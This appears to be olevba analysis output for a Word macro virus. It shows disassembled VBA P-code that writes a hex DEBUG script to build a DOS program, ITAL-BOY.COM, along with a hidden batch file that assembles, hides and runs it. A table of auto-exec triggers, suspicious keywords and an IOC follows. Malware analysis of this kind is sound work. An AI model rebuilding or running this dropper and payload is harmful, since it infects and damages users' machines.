' 	LitStr 0x0036 "E 0210 42 8B DD 33 C9 33 D2 CD 21 B4 40 8B DD BA D8 02"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 B9 06 00 CD 21 B8 01 57 5A 59 8B DD CD 21 2E FF"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 06 2F 03 B4 3E 8B DD CD 21 5D 5E 5F 07 1F 5A 59"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 5B 58 9D 2E FF 2E CE 02 CF 50 52 51 B4 2A CD 21"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 80 FE 04 74 02 EB 05 80 FA 03 73 04 59 5A 58 C3"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 59 5A 58 E8 00 00 33 D2 B9 19 00 51 B9 19 00 B3"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 22 E8 40 00 FE C2 E2 F7 B9 19 00 B3 77 E8 34 00"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 FE C2 E2 F7 B9 1B 00 B3 44 E8 28 00 FE C2 E2 F7"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 59 FE C6 32 D2 E2 D4 B4 13 B6 0A B2 0F BD E0 02"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 B9 31 00 B3 0E 32 FF CD 10 B0 00 B9 1E 00 33 D2"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 CD 26 EB FE 50 53 51 52 B4 13 B7 00 B9 01 00 0E"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 0E 07 1F BD 33 03 CD 10 5A 59 5B 58 C3 00 00 00"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 00 00 CD 20 00 00 00 00 0E B8 00 00 50 CB 00 00"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 FE 20 49 54 41 4C 59 20 20 49 53 20 20 54 48 45"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 20 20 42 45 53 54 20 20 43 4F 55 4E 54 52 59 20"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 20 49 4E 20 20 54 48 45 20 20 57 4F 52 4C 44 20"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 FE 46 75 63 6B 73 20 74 6F 20 49 74 61 6C 69 61"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 6E 20 56 69 72 75 73 20 4B 69 6C 6C 65 72 73 00"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "E 0330 00 00 0E DB"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "234"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #161:
' 	Ld WinDir 
' 	LitStr 0x000A "MrCphr.bat"
' 	Add 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #162:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "debug < "
' 	Ld WinDir 
' 	Add 
' 	LitStr 0x0012 "MrCipher.scp > nul"
' 	Add 
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "attrib +h +r "
' 	Ld WinDir 
' 	Add 
' 	LitStr 0x000C "ITAL-BOY.COM"
' 	Add 
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld WinDir 
' 	LitStr 0x000C "ITAL-BOY.COM"
' 	Add 
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	Ld WinDir 
' 	Add 
' 	LitStr 0x000C "MrCipher.scp"
' 	Add 
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "del"
' 	Ld WinDir 
' 	Add 
' 	LitStr 0x000A "MrCphr.bat"
' 	Add 
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #169:
' 	Ld WinDir 
' 	LitStr 0x000A "MrCphr.bat"
' 	Add 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #170:
' 	Label nospread 
' Line #171:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MrCphr.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

